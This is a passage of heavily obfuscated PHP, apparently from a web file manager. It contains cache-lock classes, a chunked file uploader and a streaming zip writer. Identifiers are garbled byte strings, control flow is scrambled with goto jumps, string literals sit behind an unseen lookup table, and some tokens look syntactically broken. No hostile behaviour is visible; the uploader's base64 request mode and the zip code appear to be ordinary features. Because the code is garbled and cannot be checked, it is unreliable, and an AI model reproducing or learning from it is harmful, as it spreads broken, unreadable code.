$b¿›ÜÍºŞ[$A¯ôª³Œòî[164]][$A¯ôª³Œòî[76]]; @mkdir(self::$cachePath, 511, !0); } public function lock($e®ÂÙßÂª£, $b¨Ìô¥ƒ‡Ô = 0) { goto eÀ‹Šù¹¬”; EÕÃğ”Ï™: $FÛù´ù¢êÂ = rtrim(self::$cachePath, $CÀÆÕ…Øƒ’[8]) . $CÀÆÕ…Øƒ’[786] . md5($e®ÂÙßÂª£) . $CÀÆÕ…Øƒ’[787]; if (file_exists($FÛù´ù¢êÂ) && filemtime($FÛù´ù¢êÂ) && filemtime($FÛù´ù¢êÂ) < time() - 10) { @unlink($FÛù´ù¢êÂ); } do { if (file_exists($FÛù´ù¢êÂ)) { cacheLockWait(); continue; } $EŸÜ§ÈØÕ¶ = fopen($FÛù´ù¢êÂ, $CÀÆÕ…Øƒ’[788]); if (!$EŸÜ§ÈØÕ¶) { return !1; } $FùëÊˆíßé = flock($EŸÜ§ÈØÕ¶, LOCK_EX | LOCK_NB); self::$caches[$e®ÂÙßÂª£] = array($CÀÆÕ…Øƒ’[789] => $EŸÜ§ÈØÕ¶, $CÀÆÕ…Øƒ’[164] => $FÛù´ù¢êÂ); fwrite($EŸÜ§ÈØÕ¶, $c•·¢ã­‚ˆ); clearstatcache(); if ($EŸÜ§ÈØÕ¶ && $FùëÊˆíßé) { return !0; } cacheLockWait(); } while (microtime(!0) < $c•·¢ã­‚ˆ); goto Bã»éã¦; Bã»éã¦: $this->unlock($e®ÂÙßÂª£); return !1; goto aÌíç¨‰Ë; eÀ‹Šù¹¬”: $CÀÆÕ…Øƒ’ =& $_SERVER[¿õñ]; $f¿ŞÓËîàÄ = microtime(!0); $c•·¢ã­‚ˆ = $f¿ŞÓËîàÄ + $b¨Ìô¥ƒ‡Ô + 0.0001; goto EÕÃğ”Ï™; aÌíç¨‰Ë: } public function lockGet($f‹¢„âæö¬) { $a”£œ¿ªì… =& $_SERVER[¿õñ]; $c­¯èŠ± = rtrim(self::$cachePath, $a”£œ¿ªì…[8]) . $a”£œ¿ªì…[786] . md5($f‹¢„âæö¬) . $a”£œ¿ªì…[787]; return file_exists($c­¯èŠ±); } public function unlock($eÒ±ªô‡µ¬) { goto Dç­¶­¸; AË¡‘—÷¸: unset(self::$caches[$eÒ±ªô‡µ¬]); goto dŠ×Œ¤óÕŠ; CÂÔã–µŠ°: @flock($dÍÏÊ¡¹[$Aï¯ÁšÂ«Ê[789]], LOCK_UN); @fclose($dÍÏÊ¡¹[$Aï¯ÁšÂ«Ê[789]]); @unlink($dÍÏÊ¡¹[$Aï¯ÁšÂ«Ê[164]]); goto AË¡‘—÷¸; Dç­¶­¸: $Aï¯ÁšÂ«Ê =& $_SERVER[¿õñ]; $dÍÏÊ¡¹ = self::$caches[$eÒ±ªô‡µ¬]; if (!$dÍÏÊ¡¹) { return; } goto CÂÔã–µŠ°; dŠ×Œ¤óÕŠ: } } class CacheLockRedis { public function lock($aóË‚¼‡Ã·, $F­ËÛâ…ğå = 10) { $f¦‡ÂÓÈ³ = Cache::init(); $fÓ“øÒÖµ = microtime(!0) + $F­ËÛâ…ğå; while (microtime(!0) < $fÓ“øÒÖµ) { $A”æâ†îŠ = $f¦‡ÂÓÈ³->get($aóË‚¼‡Ã·); if (!$A”æâ†îŠ) { $E¬µÆÊîÔ• = $f¦‡ÂÓÈ³->setLock($aóË‚¼‡Ã·, $fÓ“øÒÖµ, $F­ËÛâ…ğå); if ($E¬µÆÊîÔ•) { return !0; } } else { if ($A”æâ†îŠ < microtime(!0)) { $f¦‡ÂÓÈ³->set($aóË‚¼‡Ã·, $fÓ“øÒÖµ, $fÓ“øÒÖµ); if ($f¦‡ÂÓÈ³->get($aóË‚¼‡Ã·) === $A”æâ†îŠ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($aÊ…¹‚Ô) { return Cache::init()->get($aÊ…¹‚Ô); } public function unlock($Dˆ‚ÄÊ®) { return Cache::init()->remove($Dˆ‚ÄÊ®); } } goto bİô¿æŞ¥„; eš¯‡«½ÊÒ: function beforeShutdownFatalError($c·ôÀ¯ÙŒ) { think_exception($c·ôÀ¯ÙŒ); } $_SERVER[$_SERVER[ĞÌÅˆ•ÉíŒÆÆ][47]] = $F¡¼‘‚¬Ê°($_SERVER[$_SERVER[ĞÌÅˆ•ÉíŒÆÆ][44]]); $cÌÌ§‚‹™§ = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto eñ÷½ÑÑŸ†; EÏŠ£œÃ×’: if (class_exists($_SERVER[¿õñ][1876])) { class Services_JSON_Error extends PEAR_Error { function __construct($FÆ÷†’‹²ñ = "\x75\156\x6b\x6e\x6f\167\x6e\40\x65\162\x72\157\162", $B‡öŠôÚ = null, $CâÍ‚Ô¦… = null, $Câêõõ³ª– = null, $B½Š¢¢—‰” = null) { parent::PEAR_Error($FÆ÷†’‹²ñ, $B‡öŠôÚ, $CâÍ‚Ô¦…, $Câêõõ³ª–, $B½Š¢¢—‰”); } } } else { class Services_JSON_Error { function __construct($AÃëí‡¨àÕ = "\165\156\x6b\x6e\157\167\156\x20\145\162\162\x6f\162", $d¦ÔéÓÉ¼ = null, $bŒªÚ¾À = null, $BƒóİÀğ§ª = null, $cƒ°‘ ÚğŠ = null) { } } } class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto cÈöµ›–®; cÈöµ›–®: $d¼´¨ì‰‹ =& $_SERVER[¿õñ]; global $in; $this->in =& $in; goto AÉÄÌ¬ëĞ; AÉÄÌ¬ëĞ: if (!empty($_FILES)) { $e‰òß×¬Îç = $_FILES[$d¼´¨ì‰‹[164]]; $this->uploadFile = $e‰òß×¬Îç[$d¼´¨ì‰‹[1877]]; if (!$this->uploadFile && $e‰òß×¬Îç[$d¼´¨ì‰‹[1188]] > 0) { show_json($this->errorInfo($e‰òß×¬Îç[$d¼´¨ì‰‹[1188]]), !1); } } else { if (isset($in[$d¼´¨ì‰‹[383]])) { $this->uploadFile = isset($in[$d¼´¨ì‰‹[1878]]) ? $d¼´¨ì‰‹[1879] : $d¼´¨ì‰‹[1721]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto e‘°Å»¯ñ; e‘°Å»¯ñ: $this->checkSize(); $this->tempPathInit(); goto bÒ³¢ÜõŠ; bÒ³¢ÜõŠ: } public function upload() { goto bÆ„ôÎÕ; dó•÷‚Ùß¢: $B‚À…Ô²‹– = $this->writeTo($eòå»ÙãÛ, $bäŒÜÔø¥, $this->tempFile); $aÅ†×ï®ÂÆ = IO::hashSimple($eòå»ÙãÛ); $dƒİ°¼ƒ·õ = IO::size($eòå»ÙãÛ); goto C…ß”‹Ú‰”; C…ß”‹Ú‰”: @unlink($eòå»ÙãÛ); if (!$B‚À…Ô²‹–) { $this->showJson($C•¤İéÆ«[1888] . $Då»¼¶ÛôŸ, !1); } $cˆĞìâäÎ[$C•¤İéÆ«[1889]] = $F¢îÓ„¢îí; goto cŒ—»±¯•À; DŒ¬ïë»âÆ: $c£ƒ¸ Ë®» = $this->tempFile . $C•¤İéÆ«[1882] . $Då»¼¶ÛôŸ; $dƒİ°¼ƒ·õ = isset($this->in[$C•¤İéÆ«[513]]) ? intval($this->in[$C•¤İéÆ«[513]]) : 0; $fƒ¡êÇ¨İ = isset($this->in[$C•¤İéÆ«[1883]]) ? intval($this->in[$C•¤İéÆ«[1883]]) : 0; goto cÆ…ÙÇÌŒ…; cÆ…ÙÇÌŒ…: if ($F¢îÓ„¢îí > 1 && $fƒ¡êÇ¨İ <= 0) { show_json($C•¤İéÆ«[1884], !1); } if ($fƒ¡êÇ¨İ > $dƒİ°¼ƒ·õ) { $F¢îÓ„¢îí = 1; } if ($F¢îÓ„¢îí <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto fñø¿§·ŸÕ; C™ê …‹—: $c±îáÈ½¼¯ = $Då»¼¶ÛôŸ * $fƒ¡êÇ¨İ; $bäŒÜÔø¥ = @fopen($this->tempFile, $C•¤İéÆ«[1887]); fseek($bäŒÜÔø¥, $c±îáÈ½¼¯); goto dó•÷‚Ùß¢; c›¦…Î±íÆ: ignore_timeout(); if (!$this->checkChunkHash($cˆĞìâäÎ)) { $this->showJson($C•¤İéÆ«[1894], !1); } $this->statusSet(!1); goto F‡Ô¶ÀŸí¤; a›‡Ã…„: $eòå»ÙãÛ = $this->moveUploadedFile($c£ƒ¸ Ë®»); if ($dƒİ°¼ƒ·õ > 0 && filesize($eòå»ÙãÛ) == 0) { $this->showJson($C•¤İéÆ«[1885], !1); } if (!$eòå»ÙãÛ) { $this->showJson(LNG($C•¤İéÆ«[1886]), !1); } goto C™ê …‹—; cŒ—»±¯•À: $cˆĞìâäÎ[$C•¤İéÆ«[1890]][$C•¤İéÆ«[1891] . $Då»¼¶ÛôŸ] = array($C•¤İéÆ«[1892] => $c±îáÈ½¼¯, $C•¤İéÆ«[1021] => $Då»¼¶ÛôŸ, $C•¤İéÆ«[78] => $dƒİ°¼ƒ·õ, $C•¤İéÆ«[161] => $aÅ†×ï®ÂÆ); $this->statusSet($cˆĞìâäÎ); if (count($cˆĞìâäÎ[$C•¤İéÆ«[1890]]) != $cˆĞìâäÎ[$C•¤İéÆ«[1889]]) { $this->showJson($C•¤İéÆ«[1893] . $Då»¼¶ÛôŸ, !0); } goto c›¦…Î±íÆ; F‡Ô¶ÀŸí¤: CacheLock::unlock($this->tempFile); return $this->tempFile; goto f÷„ÌÉ÷†Ã; bÆ„ôÎÕ: $C•¤İéÆ« =& $_SERVER[¿õñ]; $Då»¼¶ÛôŸ = isset($this->in[$C•¤İéÆ«[1880]]) ? intval($this->in[$C•¤İéÆ«[1880]]) : 0; $F¢îÓ„¢îí = isset($this->in[$C•¤İéÆ«[1881]]) ? intval($this->in[$C•¤İéÆ«[1881]]) : 1; goto DŒ¬ïë»âÆ; fñø¿§·ŸÕ: CacheLock::lock($this->tempFile, 20); $cˆĞìâäÎ = $this->statusGet(); $this->initFileTemp(); goto a›‡Ã…„; f÷„ÌÉ÷†Ã: } private function checkSize() { $E…ôà…ò¡ =& $_SERVER[¿õñ]; if (phpBuild64() || $this->in[$E…ôà…ò¡[78]] < PHP_INT_MAX) { return; } show_json(LNG($E…ôà…ò¡[1895]), !1); } private function showJson($c§Ü‹ÃÉÑÄ, $DÂÏ“½àÈ) { CacheLock::unlock($this->tempFile); if (!$DÂÏ“½àÈ) { return show_json($c§Ü‹ÃÉÑÄ, $DÂÏ“½àÈ); } show_json($c§Ü‹ÃÉÑÄ, $DÂÏ“½àÈ); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto dê·©»¤Íˆ; AÃËˆØ¶Öä: touch($FÄŒÎ¨à . $Dá‹‡‡°¼[1896]); $D¨Ğ§Ç½Ï¥ = isset($this->in[$Dá‹‡‡°¼[1897]]) ? $this->in[$Dá‹‡‡°¼[1897]] : !1; if (strlen($D¨Ğ§Ç½Ï¥) < 30) { $D¨Ğ§Ç½Ï¥ = md5(USER_ID . $this->in[$Dá‹‡‡°¼[76]] . $this->fileName . $this->in[$Dá‹‡‡°¼[78]]); } goto AŞ©‡Ö–±İ; dê·©»¤Íˆ: $Dá‹‡‡°¼ =& $_SERVER[¿õñ]; $FÄŒÎ¨à = TEMP_FILES; @mk_dir($FÄŒÎ¨à); goto AÃËˆØ¶Öä; AŞ©‡Ö–±İ: $this->tempFile = $FÄŒÎ¨à . $Dá‹‡‡°¼[1898] . md5($D¨Ğ§Ç½Ï¥ . $this->in[$Dá‹‡‡°¼[1440]]); goto f“æ¯½ˆ; f“æ¯½ˆ: } private function moveUploadedFile($aÔ¿°µÔ‘) { $b¦˜§â¸–Ï =& $_SERVER[¿õñ]; $B²˜²¨¾ò± = $this->uploadFile; if ($B²˜²¨¾ò± == $b¦˜§â¸–Ï[1899]) { @file_put_contents($aÔ¿°µÔ‘, base64_decode($_REQUEST[$b¦˜§â¸–Ï[1900]])); } else { if ($B²˜²¨¾ò± == $b¦˜§â¸–Ï[1721]) { $a—Œµëô­Ö = @fopen($aÔ¿°µÔ‘, $b¦˜§â¸–Ï[1430]); $this->writeTo($B²˜²¨¾ò±, $a—Œµëô­Ö, $aÔ¿°µÔ‘); } else { if (!move_uploaded_file($B²˜²¨¾ò±, $aÔ¿°µÔ‘)) { return !1; } } } return $aÔ¿°µÔ‘; } private function writeTo($aÂ±Îª®’Ğ, $Eñîø–Ş°§, $Bïìà×ºÂ­) { goto CòØ®”Ôª; CòØ®”Ôª: $BÛ‹Œèäƒ³ =& $_SERVER[¿õñ]; $C‚¢ô£Áõ = $BÛ‹Œèäƒ³[1901] . $Bïìà×ºÂ­; $FÖÁ¸«··Û = CacheLock::lock($C‚¢ô£Áõ, 1); goto Cª›³³¡µ; Cª›³³¡µ: $B›‡Ò½ÇšŠ = @fopen($aÂ±Îª®’Ğ, $BÛ‹Œèäƒ³[1429]); if (!$B›‡Ò½ÇšŠ || !$Eñîø–Ş°§ || !$FÖÁ¸«··Û) { CacheLock::unlock($C‚¢ô£Áõ); return !1; } while (!feof($B›‡Ò½ÇšŠ)) { fwrite($Eñîø–Ş°§, fread($B›‡Ò½ÇšŠ, 1024 * 200)); } goto Eé‚¥ÍÁ†¡; eéÂŒƒ­Ğ±: return !0; goto F·  ‘‹Ÿ¥; Eé‚¥ÍÁ†¡: fclose($B›‡Ò½ÇšŠ); fclose($Eñîø–Ş°§); CacheLock::unlock($C‚¢ô£Áõ); goto eéÂŒƒ­Ğ±; F·  ‘‹Ÿ¥: } private function statusGet() { goto aéç£éÂ­ó; dƒÄÁš¶î: if (!$this->statusData) { $a½ÊÊÀ£Æ = array($FŠÌ›‡¸§[28] => $this->fileName, $FŠÌ›‡¸§[1889] => 0, $FŠÌ›‡¸§[1890] => array()); $this->statusSet($a½ÊÊÀ£Æ); } return $this->statusData; goto BŞÀÀÁ……¡; FÌÃ©©íí: $B‡‘ç§Š¸† = !1; if (file_exists($E­Ø„†»áá)) { $B‡‘ç§Š¸† = @file_get_contents($E­Ø„†»áá); } if ($B‡‘ç§Š¸†) { $this->statusData = unserialize($B‡‘ç§Š¸†); } goto dƒÄÁš¶î; aéç£éÂ­ó: $FŠÌ›‡¸§ =& $_SERVER[¿õñ]; if (is_array($this->statusData)) { return $this->statusData; } $E­Ø„†»áá = $this->tempFile . $FŠÌ›‡¸§[1902]; goto FÌÃ©©íí; BŞÀÀÁ……¡: } public function statusSet($D¬‡Õô‡½) { $D‡¹öù´§‚ = $this->tempFile . $_SERVER[¿õñ][1902]; if (!$D¬‡Õô‡½) { if (file_exists($D‡¹öù´§‚)) { @unlink($D‡¹öù´§‚); } return !0; } $this->statusData = $D¬‡Õô‡½; return file_put_contents($D‡¹öù´§‚, serialize($D¬‡Õô‡½)); } private function initFileTemp() { $Cøï±ƒùÑÕ =& $_SERVER[¿õñ]; if (file_exists($this->tempFile)) { return; } $Bé´‡‰É„“ = fopen($this->tempFile, $Cøï±ƒùÑÕ[1903]); fseek($Bé´‡‰É„“, $this->in[$Cøï±ƒùÑÕ[78]] - 1, SEEK_SET); fwrite($Bé´‡‰É„“, $Cøï±ƒùÑÕ[464]); fclose($Bé´‡‰É„“); } public function checkChunk() { goto bï…ÈÛÒœ; bï…ÈÛÒœ: $fØ‡ª¹ñÎ¿ =& $_SERVER[¿õñ]; $eà¼ä“ƒ­‹ = array(); CacheLock::lock($this->tempFile); goto DÙç“¿—¨¤; dªä“½ô: return $eà¼ä“ƒ­‹; goto FÎ·²œƒİİ; DÙç“¿—¨¤: $a±Õ‘‘æø = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($a±Õ‘‘æø[$fØ‡ª¹ñÎ¿[1890]] as $D‘ÃÌøíçƒ) { $E‡á¡Âù²Œ = $D‘ÃÌøíçƒ[$fØ‡ª¹ñÎ¿[161]]; if ($E‡á¡Âù²Œ) { $eà¼ä“ƒ­‹[$fØ‡ª¹ñÎ¿[1904] . $D‘ÃÌøíçƒ[$fØ‡ª¹ñÎ¿[1021]]] = $E‡á¡Âù²Œ; } } goto dªä“½ô; FÎ·²œƒİİ: } private function checkChunkHash($e„èŠìˆñó) { goto EíÛÇçÉç; dò‡™äá–: $C¦ƒÜ»®î = !0; foreach ($e„èŠìˆñó[$dÜ¤×¿³çù[1890]] as $eÍ“Á£¦) { fseek($c£½†í¢¯³, $eÍ“Á£¦[$dÜ¤×¿³çù[1892]]); $dÊÒŒôÛŞÃ = PathDriverStream::hash($c£½†í¢¯³, $eÍ“Á£¦[$dÜ¤×¿³çù[78]]); if ($eÍ“Á£¦[$dÜ¤×¿³çù[161]] != $dÊÒŒôÛŞÃ) { $C¦ƒÜ»®î = !1; break; } } fclose($c£½†í¢¯³); goto d™İÂŠ¶; cŠ‡ÈĞäÚ: $Cµ°ñŠÀŒ = _get($this->in, $dÜ¤×¿³çù[1905]); if (strlen($Cµ°ñŠÀŒ) == 32 && IO::hashSimple($this->tempFile) == $dî×Ò¨Ÿ®… && IO::hashMd5($this->tempFile) == $Cµ°ñŠÀŒ) { return !0; } $c£½†í¢¯³ = fopen($this->tempFile, $dÜ¤×¿³çù[1138]); goto dò‡™äá–; EíÛÇçÉç: $dÜ¤×¿³çù =& $_SERVER[¿õñ]; if (count($e„èŠìˆñó[$dÜ¤×¿³çù[1890]]) != $e„èŠìˆñó[$dÜ¤×¿³çù[1889]]) { return !1; } $dî×Ò¨Ÿ®… = _get($this->in, $dÜ¤×¿³çù[1897]); goto cŠ‡ÈĞäÚ; d™İÂŠ¶: return $C¦ƒÜ»®î; goto F½‘µ¸è; F½‘µ¸è: } public static function fileName() { goto bå½º„ÌÌ¼; d™°®ÉêÀ: if ($aŠëˆáçª§ == $Eñ«Ïòæ©ó[1907] || $aŠëˆáçª§ == $Eñ«Ïòæ©ó[1908]) { $cË¨ôæíÍå = date($Eñ«Ïòæ©ó[687], $fïŠá×‘Ê¦) . $Eñ«Ïòæ©ó[71] . $in[$Eñ«Ïòæ©ó[78]] . $Eñ«Ïòæ©ó[1536]; } else { if ($aŠëˆáçª§ == $Eñ«Ïòæ©ó[1909]) { $cË¨ôæíÍå = date($Eñ«Ïòæ©ó[687], $fïŠá×‘Ê¦) . $Eñ«Ïòæ©ó[71] . $in[$Eñ«Ïòæ©ó[78]] . $Eñ«Ïòæ©ó[1910]; } } return $cË¨ôæíÍå; goto e™‘ˆ°µ; eµÕ¡æßñÔ: $fïŠá×‘Ê¦ = strtotime($in[$Eñ«Ïòæ©ó[1906]]); $fïŠá×‘Ê¦ = $fïŠá×‘Ê¦ ? $fïŠá×‘Ê¦ : time(); $aŠëˆáçª§ = strtolower($cË¨ôæíÍå); goto d™°®ÉêÀ; bå½º„ÌÌ¼: $Eñ«Ïòæ©ó =& $_SERVER[¿õñ]; global $in; $cË¨ôæíÍå = isset($in[$Eñ«Ïòæ©ó[28]]) ? $in[$Eñ«Ïòæ©ó[28]] : $Eñ«Ïòæ©ó[33]; goto a«š£òåÚÔ; a«š£òåÚÔ: if (!empty($_FILES)) { $cË¨ôæíÍå = $cË¨ôæíÍå ? $cË¨ôæíÍå : $_FILES[$Eñ«Ïòæ©ó[164]][$Eñ«Ïòæ©ó[383]]; } $cË¨ôæíÍå = str_replace(array($Eñ«Ïòæ©ó[94], $Eñ«Ïòæ©ó[8]), array($Eñ«Ïòæ©ó[8], $Eñ«Ïòæ©ó[92]), trim($cË¨ôæíÍå)); if (!is_wap()) { return $cË¨ôæíÍå; } goto eµÕ¡æßñÔ; e™‘ˆ°µ: } private function errorInfo($c„ğÕ¿·÷Í) { $Dˆß™Íø´ =& $_SERVER[¿õñ]; $EŸÙ‰ÍŒÒµ = array($Dˆß™Íø´[1911], $Dˆß™Íø´[1912], $Dˆß™Íø´[1913], $Dˆß™Íø´[1914], $Dˆß™Íø´[1915], $Dˆß™Íø´[1916], $Dˆß™Íø´[1917], $Dˆß™Íø´[1918]); return $c„ğÕ¿·÷Í . $Dˆß™Íø´[4] . $EŸÙ‰ÍŒÒµ[$c„ğÕ¿·÷Í]; } } class ZipMake { const VERSION = "\x30\x2e\x32\x2e\x30"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($Côƒ°©˜™ = null) { $bƒ‡¾Ã°Êë =& $_SERVER[¿õñ]; $this->outputStream = fopen($bƒ‡¾Ã°Êë[1919], $bƒ‡¾Ã°Êë[1194]); $this->outputName = $Côƒ°©˜™; $this->needHeaders = !0; } public function addFile($e‘ÜâÒ§ñ£, $bÒ¢ØÏ¦‘À) { goto dÈ¾©ƒÁ; fÙÃìªÊ± : $B†¥¶ôÇ· = $this->addFileHeader($e‘ÜâÒ§ñ£, $c£¼§‚°°’); $A äœÃŞ‡˜ = $Dˆ¯£Èù¡ = filesize($bÒ¢ØÏ¦‘À); $dËÜ·ç‚§ = fopen($bÒ¢ØÏ¦‘À, $bñê¹Ê‘Ùå[1920]); goto f•ÑõçîÎŠ; f•ÑõçîÎŠ: while (!feof($dËÜ·ç‚§)) { $C¾ªÔš‹ËÕ = fread($dËÜ·ç‚§, 1048576); $this->send($C¾ªÔš‹ËÕ); } fclose($dËÜ·ç‚§); $bğ³¤ùÖ°È = hexdec(hash_file($bñê¹Ê‘Ùå[1921], $bÒ¢ØÏ¦‘À)); goto aùÜ¨µ‹¬‘; dÈ¾©ƒÁ: $bñê¹Ê‘Ùå =& $_SERVER[¿õñ]; $e‘ÜâÒ§ñ£ = $this->filterFilename($e‘ÜâÒ§ñ£); $c£¼§‚°°’ = static::METHOD_STORE; goto fÙÃìªÊ± ; aùÜ¨µ‹¬‘: $this->addFileFooter($e‘ÜâÒ§ñ£, $c£¼§‚°°’, $bğ³¤ùÖ°È, $A äœÃŞ‡˜, $Dˆ¯£Èù¡, $B†¥¶ôÇ·); goto F¢¦é…ÏÇ¡; F¢¦é…ÏÇ¡: } public function addFileFromStream($CéòºËÄÓ, $bõ•ˆæŒ¬) { goto EÛŒ“ºÌ÷ ; b’Û”óËÏ: $B–„¶–åµÍ = hash_init($_SERVER[¿õñ][1921]); while (!feof($bõ•ˆæŒ¬)) { $cğ…Ÿñç‘‚ = fread($bõ•ˆæŒ¬, 1048576); hash_update($B–„¶–åµÍ, $cğ…Ÿñç‘‚); $this->send($cğ…Ÿñç‘‚); } $Fˆ•¹ÕÚÎß = hexdec(hash_final($B–„¶–åµÍ)); goto Bè¹§ì± ¾; EÛŒ“ºÌ÷ : $CéòºËÄÓ = $this->filterFilename($CéòºËÄÓ); $c‹ß„‡ñô— = static::METHOD_STORE; $aØáÉÜƒÌŠ = $this->addFileHeader($CéòºËÄÓ, $c‹ß„‡ñô—); goto Eäçìà»Éé; Bè¹§ì± ¾: $this->addFileFooter($CéòºËÄÓ, $c‹ß„‡ñô—, $Fˆ•¹ÕÚÎß, $C«¨ç´¡Ş, $açöÎÁÀİ¥, $aØáÉÜƒÌŠ); goto F’’ƒÃœµ–; Eäçìà»Éé: fseek($bõ•ˆæŒ¬, 0, SEEK_END); $C«¨ç´¡Ş = $açöÎÁÀİ¥ = ftell($bõ•ˆæŒ¬); rewind($bõ•ˆæŒ¬); goto b’Û”óËÏ; F’’ƒÃœµ–: } public function finish() { foreach ($this->files as $AïĞ·ŒÎˆ…) { $this->addCdrFile($AïĞ·ŒÎˆ…); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($B©íÎ©Ñ¾, $DâÇ›‡£å•) { goto d©Ì­ˆšŸ’; AŠªãÏ‡˜ß: $aŠ¾íëäš¼ = $this->packFields($FÔß˜‹¨¶É); $c±Ùíåò¿× = $this->packFields($cÕè¾ˆ³ÏÎ); $this->send($aŠ¾íëäš¼ . $B©íÎ©Ñ¾ . $c±Ùíåò¿×); goto cÖ°µŠâĞÉ; cÖ°µŠâĞÉ: return strlen($aŠ¾íëäš¼) + $AÏ²†èÎ¿É + strlen($c±Ùíåò¿×); goto AºâëĞ‰†è; CÎÉ»åàíÈ: $EŞ­àõ÷Ğ° = $this->dosTime(time()); $FÔß˜‹¨¶É = array(array($dĞİŒ¯Ñ‹[1923], static::FILE_HEADER_SIGNATURE), array($dĞİŒ¯Ñ‹[1924], static::ZIP_VERSION_64), array($dĞİŒ¯Ñ‹[1924], 8), array($dĞİŒ¯Ñ‹[1924], $DâÇ›‡£å•), array($dĞİŒ¯Ñ‹[1923], $EŞ­àõ÷Ğ°), array($dĞİŒ¯Ñ‹[1923], 0), array($dĞİŒ¯Ñ‹[1923], 4294967295), array($dĞİŒ¯Ñ‹[1923], 4294967295), array($dĞİŒ¯Ñ‹[1924], $AÏ²†èÎ¿É), array($dĞİŒ¯Ñ‹[1924], 32)); $cÕè¾ˆ³ÏÎ = array(array($dĞİŒ¯Ñ‹[1924], 1), array($dĞİŒ¯Ñ‹[1924], 28), array($dĞİŒ¯Ñ‹[1925], 0), array($dĞİŒ¯Ñ‹[1925], 0), array($dĞİŒ¯Ñ‹[1925], 0), array($dĞİŒ¯Ñ‹[1923], 0)); goto AŠªãÏ‡˜ß; d©Ì­ˆšŸ’: $dĞİŒ¯Ñ‹ =& $_SERVER[¿õñ]; $B©íÎ©Ñ¾ = preg_replace($dĞİŒ¯Ñ‹[1922], $dĞİŒ¯Ñ‹[33], $B©íÎ©Ñ¾); $AÏ²†èÎ¿É = strlen($B©íÎ©Ñ¾); goto CÎÉ»åàíÈ; AºâëĞ‰†è: } protected function addFileFooter($d‰½ÙÜ’Û, $f‡ê£½‚»ï, $B¹ÛœÃŸ©, $F×Í®£à‡, $dá¬´ŸÂ˜Ş, $AÕÍ¤ˆèÁ…) { $eƒ¼œ“ëè¬ =& $_SERVER[¿õñ]; $A™ŠÑÑ¬·ê = array(array($eƒ¼œ“ëè¬[1923], static::DATA_DESCRIPTOR_SIGNATURE), array($eƒ¼œ“ëè¬[1923], $B¹ÛœÃŸ©), array($eƒ¼œ“ëè¬[1925], $F×Í®£à‡), array($eƒ¼œ“ëè¬[1925], $dá¬´ŸÂ˜Ş)); $C÷ÂáÛÑ¼‰ = $this->packFields($A™ŠÑÑ¬·ê); $this->send($C÷ÂáÛÑ¼‰); $AãÈÖ¸ë÷ = $AÕÍ¤ˆèÁ… + $F×Í®£à‡ + $e»ì–ğ¾˜ã; $this->addToCdr($d‰½ÙÜ’Û, $f‡ê£½‚»ï, $B¹ÛœÃŸ©, $F×Í®£à‡, $dá¬´ŸÂ˜Ş, $AãÈÖ¸ë÷); } private function addToCdr($e§›áÔîˆ, $A™¢„±ñÉÆ, $CİÅŠÔöÖ, $Fƒ¯ªÃµÆ, $Cù¸ìÎ©’¬, $bï££»ƒ‹«) { $this->files[] = array($e§›áÔîˆ, $A™¢„±ñÉÆ, $CİÅŠÔöÖ, $Fƒ¯ªÃµÆ, $Cù¸ìÎ©’¬, $this->ofs); $this->ofs += $bï££»ƒ‹«; } protected function addCdrFile($c ·±îè†Ö) { goto AÙ…ÍÜ½Ä; C¶ñŠÂ×³: $BÆøĞµí›ô = $this->dosTime(time()); $F»‡‰‘Ïƒ = array(array($Dõí£œ¾±Ç[1923], static::CDR_FILE_SIGNATURE), array($Dõí£œ¾±Ç[1924], static::ZIP_VERSION_64), array($Dõí£œ¾±Ç[1924], static::ZIP_VERSION_64), array($Dõí£œ¾±Ç[1924], 8), array($Dõí£œ¾±Ç[1924], $dë¹ÕŒ‘ƒ), array($Dõí£œ¾±Ç[1923], $BÆøĞµí›ô), array($Dõí£œ¾±Ç[1923], $DƒÛÇÜö½), array($Dõí£œ¾±Ç[1923], 4294967295), array($Dõí£œ¾±Ç[1923], 4294967295), array($Dõí£œ¾±Ç[1924], strlen($Dê÷è¯Æõ»)), array($Dõí£œ¾±Ç[1924], 32), array($Dõí£œ¾±Ç[1924], strlen($aàÒ÷Å¸¨¢)), array($Dõí£œ¾±Ç[1924], 0), array($Dõí£œ¾±Ç[1924], 0), array($Dõí£œ¾±Ç[1923], 32), array($Dõí£œ¾±Ç[1923], 4294967295)); $Bç­à“»æŠ = array(array($Dõí£œ¾±Ç[1924], 1), array($Dõí£œ¾±Ç[1924], 28), array($Dõí£œ¾±Ç[1925], $E¸Åªì‡Æñ), array($Dõí£œ¾±Ç[1925], $C¤ÛËÖŸÌÄ), array($Dõí£œ¾±Ç[1925], $E˜Ü¡¶±Ë†), array($Dõí£œ¾±Ç[1923], 0)); goto bôÌã«†–à; bôÌã«†–à: $AŠŠÓåÏõ’ = $this->packFields($F»‡‰‘Ïƒ); $c¹Ñ–ôä‚‘ = $this->packFields($Bç­à“»æŠ); $e™Ÿ†¶ØÒ = $AŠŠÓåÏõ’ . $Dê÷è¯Æõ» . $aàÒ÷Å¸¨¢ . $c¹Ñ–ôä‚‘; goto BÅ¯ÙŞä; BÅ¯ÙŞä: $this->send($e™Ÿ†¶ØÒ); $this->cdr_ofs += strlen($e™Ÿ†¶ØÒ); goto C£‹ß¡—«á; AÙ…ÍÜ½Ä: $Dõí£œ¾±Ç =& $_SERVER[¿õñ]; list($Dê÷è¯Æõ», $dë¹ÕŒ‘ƒ, $DƒÛÇÜö½, $C¤ÛËÖŸÌÄ, $E¸Åªì‡Æñ, $E˜Ü¡¶±Ë†) = $c ·±îè†Ö; 